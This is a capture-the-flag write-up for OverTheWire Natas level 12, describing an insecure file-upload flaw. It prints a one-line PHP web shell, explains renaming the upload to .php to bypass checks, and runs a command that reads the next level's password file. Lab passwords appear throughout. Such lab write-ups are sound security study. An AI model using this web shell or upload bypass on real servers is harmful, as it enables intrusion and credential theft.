# Natas Level 12 → Level 13

## 🚩 Challenge Info

- **Platform:** OverTheWire – Natas Wargame  
- **Level:** 12 → 13  
- **Category:** Web Security / File Upload Vulnerability  
- **URL:** http://natas12.natas.labs.overthewire.org  
- **Username:** `natas12`  
- **Password:** `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`

---

## 🎯 Objective

Find the password for **natas13** by exploiting an insecure **file upload mechanism**.

---

## 🔍 Observations

When visiting the page, a **file upload form** appears.

The page allows the user to upload an image file and then provides a link to the uploaded file.

### 1. Inspecting the Upload Request

Using **Developer Tools (Network tab)** or an intercepting proxy like **Burp Suite**, we observe that the file upload request contains a parameter named:


filename


The application appears to use this parameter to determine the extension of the uploaded file.

---

## 🛠️ Investigation

### 1. Understanding the Vulnerability

The application does not properly validate the uploaded file type.  
Instead, it only checks the filename provided in the request.

This means an attacker can upload a **PHP web shell** disguised as an image.

Example malicious file:

`<?php system($_GET['cmd']); ?>`

### 2. Uploading a Malicious File

Upload the file as:

>shell.php

However, the application may attempt to rename the file.

Intercept the request and modify the `filename parameter` from Content-Disposition section`(.img to .php)` . So the uploaded file retains the `.php extension`.

Example request parameter:

>filename=shell.php
### 3. Accessing the Uploaded File

After uploading, the server returns a path similar to:

>upload/abc123.php

Open the uploaded file in the browser and execute a command:

http://natas12.natas.labs.overthewire.org/upload/abc123.php?cmd=cat /etc/natas_webpass/natas13

## 💡 Discovery
### 1. Executing the Command

The PHP shell executes the command:

>cat /etc/natas_webpass/natas13

This file contains the password for the next level.

### 2. Retrieving the Password

The output reveals:
```php
natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC